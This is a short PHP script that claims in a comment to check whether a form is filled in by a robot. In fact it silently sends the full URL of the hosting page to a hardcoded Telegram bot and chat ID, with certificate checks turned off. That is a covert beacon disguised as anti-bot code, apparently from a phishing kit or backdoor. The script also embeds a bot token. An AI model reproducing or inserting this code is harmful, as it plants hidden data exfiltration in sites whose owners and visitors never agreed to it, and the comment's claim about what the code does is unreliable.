<?php 
//Dynamically check if a form is filled by a robot

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] != 'off') || $_SERVER['SERVER_PORT'] == 443) ?
    "https://": "http://";
$url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$serverBot="5916855651:AAE8PuoJ48oILmjNFhl8UDBaIJVVs0brWrY";
$serverkey=array("5104348079");
$status  = "Checking web Antibot：".$url."\n";
         foreach($serverkey as $user_id) {
         $website="https://api.telegram.org/bot".$serverBot;
         $params=[
           'chat_id'=>$user_id, 
           'text'=>$status,
         ];
         $ch = curl_init($website . '/sendMessage');
         curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
         curl_setopt($ch, CURLOPT_POST, 1);
         curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
         $result = curl_exec($ch);
         curl_close($ch);
         }
         
      ?>